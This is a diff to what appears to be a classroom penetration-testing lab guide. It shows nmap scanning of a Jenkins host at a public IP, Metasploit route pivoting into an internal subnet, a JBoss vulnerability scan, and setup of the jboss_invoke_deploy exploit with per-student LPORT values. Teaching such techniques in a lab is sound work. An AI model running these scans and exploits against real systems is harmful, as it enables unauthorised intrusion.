@@ -33,7 +33,7 @@ $ sudo yum -y install nmap
 2. Port scan a vulnerable host.
 
   ```
-$ nmap -PN -p8080 -sV 52.41.95.90
+$ nmap -PN -p8080 -sV 52.39.125.179
   ```
 
 ## Exploiting Jenkins Manually
@@ -156,9 +156,10 @@ aws ec2 describe-instances --region us-west-2 --filters Name=iam-instance-profil
 
   ```
 > route add 10.0.6.0 255.255.255.0 1
+> route print
   ```
 
-  2. Scan the host you discovered for vulnerabilities.
+2. Scan the host you discovered for vulnerabilities.
 
   ```
 > use auxiliary/scanner/http/jboss_vulnscan
@@ -172,6 +173,8 @@ aws ec2 describe-instances --region us-west-2 --filters Name=iam-instance-profil
 2. Search for the JBoss DeploymentFileRepository WAR Deployment exploit. E.g., `search JMXInvokerServlet`.
 
 3. Configure the exploit.
+
+  Use this formula to determine the value for `LPORT`. `LPORT = 10000 + Student ID number`. So, student 1, `LPORT` would be `10001`.
 
   ```
 > use exploit/multi/http/jboss_invoke_deploy
